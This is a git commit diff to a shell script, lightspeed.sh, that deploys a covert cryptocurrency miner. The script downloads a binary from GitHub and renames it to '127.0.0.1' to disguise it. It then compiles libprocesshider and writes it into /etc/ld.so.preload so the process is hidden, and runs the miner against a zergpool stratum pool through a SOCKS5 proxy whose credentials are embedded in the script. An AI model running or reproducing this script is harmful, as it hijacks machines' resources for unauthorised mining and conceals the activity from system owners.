39c15d6abbd8e1e25348542dc4ac697c7ee65183
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-06-25 08:29:57 +0000

    Update lightspeed.sh

--- lightspeed.sh
+++ lightspeed.sh
@@ -1,10 +1,10 @@
-wget https://github.com/Testdrive345/hello/raw/main/test
-chmod 777 test
+wget https://github.com/Testdrive345/hello/raw/main/gold
+chmod 777 gold
 sudo apt-get install -y automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++
 
 
 
-mv test 0.0.0
+mv gold  127.0.0.1
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -13,4 +13,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./0.0.0 -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
+./127.0.0.1 -a minotaurx -o stratum+tcp://minotaurx.na.mine.zergpool.com:7019 -u MBsiaTaEEUNsMHFZKPmqT35Sv3rbiLLkAp -p  c=LCC,mc=LCC,ID=Test -x socks5://jvyxiovx-rotate:2udhid79wl5a@p.webshare.io:80
